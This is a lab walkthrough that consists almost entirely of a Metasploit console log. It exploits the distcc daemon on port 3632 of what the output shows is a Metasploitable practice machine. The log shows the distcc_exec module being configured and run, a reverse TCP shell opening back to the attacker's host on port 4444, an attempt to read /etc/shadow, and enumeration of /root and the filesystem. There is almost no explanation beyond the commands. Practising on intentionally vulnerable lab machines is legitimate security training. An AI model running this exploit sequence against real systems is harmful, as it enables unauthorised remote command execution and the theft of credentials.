# Attacking on Port 3632

    msf > search distccd
    [!] Module database cache not built yet, using slow search

    Matching Modules
    ================

       Name                           Disclosure Date  Rank       Description
       ----                           ---------------  ----       -----------
       exploit/unix/misc/distcc_exec  2002-02-01       excellent  DistCC Daemon Command Execution


    msf > use exploit/unix/misc/distcc_exec
    msf exploit(distcc_exec) > show options

    Module options (exploit/unix/misc/distcc_exec):

       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       RHOST                   yes       The target address
       RPORT  3632             yes       The target port (TCP)


    Exploit target:

       Id  Name
       --  ----
       0   Automatic Target


    msf exploit(distcc_exec) > set RHOST 192.168.56.101
    RHOST => 192.168.56.101
    msf exploit(distcc_exec) > show options

    Module options (exploit/unix/misc/distcc_exec):

       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       RHOST  192.168.56.101   yes       The target address
       RPORT  3632             yes       The target port (TCP)


    Exploit target:

       Id  Name
       --  ----
       0   Automatic Target


    msf exploit(distcc_exec) > run

    [*] Started reverse TCP double handler on 192.168.56.102:4444 
    [*] Accepted the first client connection...
    [*] Accepted the second client connection...
    [*] Command: echo nE9gvG9B7m55uIEr;
    [*] Writing to socket A
    [*] Writing to socket B
    [*] Reading from sockets...
    [*] Accepted the first client connection...
    [*] Accepted the second client connection...
    [*] Accepted the first client connection...
    [*] Accepted the second client connection...
    [*] Command: echo mdU5t66CQrpVwxUT;
    [*] Writing to socket A
    [*] Writing to socket B
    [*] Reading from sockets...
    [*] Reading from socket B
    [*] B: "nE9gvG9B7m55uIEr\r\n"
    [*] Matching...
    [*] A is input...
    [*] Command shell session 3 opened (192.168.56.102:4444 -> 192.168.56.101:40013) at 2018-05-23 05:35:54 +0000
    [*] Command: echo l8fLOwUcNqjZJwik;
    [*] Writing to socket A
    [*] Writing to socket B
    [*] Reading from sockets...

    cat /etc/shadow
    cat: /etc/shadow: Permission denied
    cat /etc
    cat: /etc: Is a directory
    ls
    4451.jsvc_up
    cache6wg0s8jar
    cache6wg0s9jar
    cachedgnvv4jar
    cachedgnvv6jar
    cachedgnvv8jar
    cachedgnvvajar
    cachedgnvvcjar
    cachee3522ejar
    cachee3522fjar
    cacheiryidzjar
    cacheiryie0jar
    cacherld9lcjar
    cacherld9ldjar
    cachezkvne8jar
    cachezkvne9jar
    gconfd-msfadmin
    orbit-msfadmin
    pwd
    /tmp
    cd ..
    ls
    bin
    boot
    cdrom
    dev
    etc
    home
    initrd
    initrd.img
    lib
    lost+found
    media
    mnt
    nohup.out
    opt
    proc
    root
    sbin
    srv
    sys
    tmp
    usr
    var
    venkat
    vmlinuz
    cd roor
    sh: line 11: cd: roor: No such file or directory
    cd root
    ls -la
    total 76
    drwxr-xr-x 13 root root 4096 May 21 03:06 .
    drwxr-xr-x 22 root root 4096 May 21 05:47 ..
    -rw-------  1 root root  324 May 21 03:06 .Xauthority
    lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
    -rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
    drwx------  3 root root 4096 May 20  2012 .config
    drwx------  2 root root 4096 May 20  2012 .filezilla
    drwxr-xr-x  5 root root 4096 May 21 11:23 .fluxbox
    drwx------  2 root root 4096 May 20  2012 .gconf
    drwx------  2 root root 4096 May 20  2012 .gconfd
    drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
    drwx------  4 root root 4096 May 20  2012 .mozilla
    -rw-r--r--  1 root root  141 Oct 20  2007 .profile
    drwx------  5 root root 4096 May 20  2012 .purple
    -rwx------  1 root root    4 May 20  2012 .rhosts
    drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
    drwx------  2 root root 4096 May 21 03:06 .vnc
    drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
    -rwx------  1 root root  401 May 20  2012 reset_logs.sh
    -rw-r--r--  1 root root  138 May 21 03:06 vnc.log
    du
    12	./.gstreamer-0.10
    4	./Desktop
    du: cannot read directory `./.purple': Permission denied
    4	./.purple
    du: cannot read directory `./.vnc': Permission denied
    4	./.vnc
    du: cannot read directory `./.filezilla': Permission denied
    4	./.filezilla
    du: cannot read directory `./.config': Permission denied
    4	./.config
    4	./.fluxbox/styles
    4	./.fluxbox/backgrounds
    4	./.fluxbox/pixmaps
    48	./.fluxbox
    12	./.ssh
    du: cannot read directory `./.gconfd': Permission denied
    4	./.gconfd
    du: cannot read directory `./.gconf': Permission denied
    4	./.gconf
    du: cannot read directory `./.mozilla': Permission denied
    4	./.mozilla
    132	.
    df
    Filesystem           1K-blocks      Used Available Use% Mounted on
    /dev/mapper/metasploitable-root
                           7282168   1496440   5418728  22% /
    varrun                  517620       168    517452   1% /var/run
    varlock                 517620         0    517620   0% /var/lock
    udev                    517620        20    517600   1% /dev
    devshm                  517620         0    517620   0% /dev/shm
    /dev/sda1               233333     25356    195930  12% /boot






